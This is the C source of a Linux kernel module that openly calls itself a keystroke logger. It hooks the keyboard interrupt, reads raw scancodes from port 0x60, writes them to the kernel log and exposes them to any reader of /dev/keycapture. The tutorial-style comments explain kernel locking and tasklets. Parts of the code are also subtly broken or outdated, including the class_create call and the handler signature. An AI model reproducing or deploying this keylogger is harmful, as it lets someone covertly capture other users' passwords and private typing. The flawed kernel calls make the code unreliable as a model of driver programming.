#include<linux/module.h>
#include<linux/kernel.h>
#include<asm/uaccess.h>
#include<asm/io.h>
#include<linux/cdev.h>
#include<linux/fs.h>
#include<linux/device.h>
#include<linux/interrupt.h>
#include<linux/semaphore.h>
#include<linux/spinlock.h>
#include<linux/sched.h>

const char *DEVICE_NAME = "keycapture";
const char *CLASS_NAME = "kc_class";

#define FOR(i,x,n) for(i=x;i<n;i++)
#define MAX_SIZE 16
#define FIRST_MINOR_NUM 0
#define MINOR_DEVICE_COUNT 1
#define IRQ_NUM 1


typedef struct
{
  char data[MAX_SIZE];
  int rptr;
  wait_queue_head_t wq;
  struct semaphore sem;
  spinlock_t rptr_lock;

}keycapture_device_t;


static int ret,major,keof,read_unblock = 1;
static dev_t dev_num;
static struct class *kc_class;
static struct cdev *kcdev;
static keycapture_device_t kcdevice;
static char kbuf[MAX_SIZE];
static spinlock_t kbuf_lock;

void kc_tasklet_handler(unsigned long dev)
{
  /*
    This runs in a 'soft' interrupt context where hardware interrupts are enabled while software interrupts are disabled
    There is no associated task_struct (process/kernel thread) and therefore we cannot perform any function that might sleep
   */
  keycapture_device_t *kcd = (keycapture_device_t*)dev;
  char lbuf[MAX_SIZE];
  unsigned int flags,bytes=0;
  memset(lbuf,0,sizeof lbuf);
  // acquire spinlock to ensure that the interrupt service routine is not modofying the kernel buffer currently
  spin_lock_irqsave(&kbuf_lock,flags);
  bytes = keof = (keof <= MAX_SIZE) ? keof : MAX_SIZE;
  memcpy(lbuf,kbuf,keof);
  keof = 0;
  spin_unlock_irqrestore(&kbuf_lock,flags);

  // modify the data in the lbuf 
  int i=0;
  FOR(i,0,bytes)
    {
      lbuf[i] = lbuf[i] & 0x7F;
    }
  printk(KERN_INFO "copied data : %s, bytes : %d for device %s through tasklet\n",lbuf,bytes,DEVICE_NAME);
  /*
    Now we write this data from the tasklet's local buffer into the device's data buffer
    just to ensure that no process was reading from the device when we modify its buffer, we acquire a spinlock
   */

  spin_lock_irqsave(&kcd->rptr_lock,flags);
  read_unblock = 0;
  memset(kcd->data,0,sizeof kcd->data);
  memcpy(kcd->data,lbuf,bytes);
  kcd->rptr = bytes;
  read_unblock = 1;
  spin_unlock_irqrestore(&kcd->rptr_lock,flags);
  wake_up_interruptible(&kcd->wq);
  

}

DECLARE_TASKLET(kc_tasklet,kc_tasklet_handler,(unsigned long)&kcdevice);


static void init_constructs(void)
{
  sema_init(&kcdevice.sem,1);
  spin_lock_init(&kcdevice.rptr_lock);
  spin_lock_init(&kbuf_lock);
  init_waitqueue_head(&kcdevice.wq);
}

/*
  The File-Operations are defined below
 */

static int kc_open(struct inode *kc_inode,struct file *filp)
{
  // zero the device's buffer region
  // memset(kcdevice.data,0,sizeof kcdevice.data);
 
  printk(KERN_INFO "kc_open() was called for device %s\n",DEVICE_NAME);
  return 0;
}

static int kc_close(struct inode *kc_inode,struct file *filp)
{
  printk(KERN_INFO "kc_close() was called for device %s\n",DEVICE_NAME);
  return 0;
}

static ssize_t kc_read(struct file *filp,char __user *buf,size_t count,loff_t *pos)
{
  /*
    blocking read is implemented below
    we check the device's read pointer to identify the size of data present in the device's data buffer
    if there is no data in the device, a call to this function will block
   */
  unsigned int flags = 0;
  char lbuf[MAX_SIZE];
  printk(KERN_INFO "kc_read() was called for device %s\n",DEVICE_NAME);
  
  // check the device buffer's rptr
  // first acquire the spinlock to obtain exclusive access to rptr
  spin_lock_irqsave(&kcdevice.rptr_lock,flags);
  while(read_unblock == 0)
    {
      // no data in the buffer, so we wait
      // first release the spinlock and the semaphore
      spin_unlock_irqrestore(&kcdevice.rptr_lock,flags);
      if (wait_event_interruptible(kcdevice.wq,read_unblock != 0))
	{
	  // probably a signal, let VFS decide what to do
	  return -ERESTARTSYS;
	}
      
      // re-acquire the semaphore to obtain exclusive access

      // re-acquire the spinlock to check the condition of rptr
      // NOTE : it is important to acquire the semaphore first, and then try to get the spinlock to avoid sleeping while holding a spinlock
      spin_lock_irqsave(&kcdevice.rptr_lock,flags);
    }
  read_unblock = 0;
  // now we are ready to read the device's data buffer
  printk(KERN_INFO "device data buffer end : %d, for device %s\n",kcdevice.rptr,DEVICE_NAME);
  if (*pos >= MAX_SIZE || *pos >= kcdevice.rptr)
    {
      // reader has read the entire buffer, until rptr which defines the end of buffer
      // release the spinlock first and then release the semaphore
      spin_unlock_irqrestore(&kcdevice.rptr_lock,flags);
      //      up(&kcdevice.sem);
      return 0;
    }

  if (*pos + count >= kcdevice.rptr)
    {
      count = kcdevice.rptr - *pos;
    }
  memset(lbuf,0,sizeof lbuf);
  
  // copy the device's buffer into the local buffer
  // this is done so that we can release the spinlock and allow the bottom half to proceed with the updation of the buffer
  // also, we cannot use copy_to_user() while holding the spinlock
  memcpy(lbuf,kcdevice.data,count);
  kcdevice.rptr = 0;
  spin_unlock_irqrestore(&kcdevice.rptr_lock,flags);
  
  printk(KERN_INFO "%d bytes of data : (%s), successfully copied to user's buffer from device %s\n",count,lbuf,DEVICE_NAME);

  // now we copy_to_user()
  ret = copy_to_user(buf,lbuf,count);
  if (ret)
    {
      printk(KERN_INFO "copy_to_user() failed with error %d for device %s\n",ret,DEVICE_NAME);
      // release the semaphore
      //  up(&kcdevice.sem);
      return -EFAULT;
    }

  printk(KERN_INFO "%d bytes of data : (%s), successfully copied to user's buffer from device %s\n",count,lbuf,DEVICE_NAME);
  (*pos) += count;
  //release the semaphore
  // up(&kcdevice.sem);

  return count;
  
   
}

static struct file_operations fops = {
  
  .owner = THIS_MODULE,
  .open = kc_open,
  .release = kc_close,
  .read = kc_read
  
};

// this function is the actual interrupt service routine

static irqreturn_t irq_handler(int num,void *dev,struct pt_regs *pt)
{
  unsigned char status,scancode;
  unsigned int flags;

  // read status , scancode from the IO PORTS 0x64 and 0x60 respectively

  status = inb(0x64);
  scancode = inb(0x60);
  
  spin_lock_irqsave(&kbuf_lock,flags);
  // now we can safely copy this character to the shared kernel buffer
  keof %= MAX_SIZE;
  kbuf[keof] = scancode;
  keof++;
  // release the spinlock 
  spin_unlock_irqrestore(&kbuf_lock,flags);
  
  // schedule a bottom-half (tasklet or work queue) to complete the processing of the characters stored in the shared kernel buffer
  tasklet_schedule(&kc_tasklet);
  // since this is a shared Interrupt line we return IRQ_NONE so that the actual keyboard driver's interrupt routine is called
  // otherwise we should've returned IRQ_HANDLED
  return IRQ_NONE;
  
}

static int __init keycapture_init(void)
{
  // register the device file with a major,minor number
  ret = alloc_chrdev_region(&dev_num,FIRST_MINOR_NUM,MINOR_DEVICE_COUNT,DEVICE_NAME);
  if (ret)
    {
      printk(KERN_INFO "could not alloc_chrdev_region for device %s, exit with error %d\n",DEVICE_NAME,ret);
      return -1;
    }
  major = MAJOR(dev_num);
  printk(KERN_INFO "created device %s with major number %d\n",DEVICE_NAME,major);

  // create an entry for the device in /sys/class
  kc_class = class_create(DEVICE_NAME,CLASS_NAME);
  if (!kc_class)
    {
      printk(KERN_INFO "could not add entry /sys/class/%s for device %s\n",CLASS_NAME,DEVICE_NAME);
      unregister_chrdev_region(dev_num,MINOR_DEVICE_COUNT);
      return -2;
    }

  // add the device file to /dev/keycapture
  if (! device_create(kc_class,NULL,dev_num,NULL,DEVICE_NAME))
    {
      printk(KERN_INFO "could not add device to /dev/%s\n",DEVICE_NAME);
      class_destroy(kc_class);
      unregister_chrdev_region(dev_num,MINOR_DEVICE_COUNT);
      return -2;
    }

  // create the cdev structure for the device
  kcdev = cdev_alloc();
  kcdev->owner = THIS_MODULE;
  kcdev->ops = &fops;
  ret = cdev_add(kcdev,dev_num,MINOR_DEVICE_COUNT);
  if (ret)
    {
      device_destroy(kc_class,dev_num);
      class_destroy(kc_class);
      unregister_chrdev_region(dev_num,MINOR_DEVICE_COUNT);
      printk(KERN_INFO "could not allocate a cdev structure for the character driver of the device %s\n",DEVICE_NAME);
      return -3;
    }


  // initialize synchronization constructs
  init_constructs();

  // register an interrupt service routine to listen for keypress events
  ret = request_irq(IRQ_NUM,(irqreturn_t*)irq_handler,IRQF_SHARED,DEVICE_NAME,(void*)&kcdevice);
  if (ret)
    {
      printk(KERN_INFO "could not register interrupt service routine for device %s. exit with error %d\n",DEVICE_NAME,ret);
      
      return -4;
    }
 
  printk(KERN_INFO "successfully created device %s\n",DEVICE_NAME);
  
  return 0;
}


static void __exit keycapture_exit(void)
{
  // destroy in reverse order
  free_irq(IRQ_NUM,&kcdevice);
  tasklet_kill(&kc_tasklet);
  if (kcdev)
    {
      cdev_del(kcdev);
    }
  device_destroy(kc_class,dev_num);
  class_destroy(kc_class);
  unregister_chrdev_region(dev_num,MINOR_DEVICE_COUNT);
  printk(KERN_INFO "unregistered the kernel module for the device %s\n",DEVICE_NAME);
}

module_init(keycapture_init);
module_exit(keycapture_exit);
MODULE_AUTHOR("morpheus15");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("keystroke logging application");
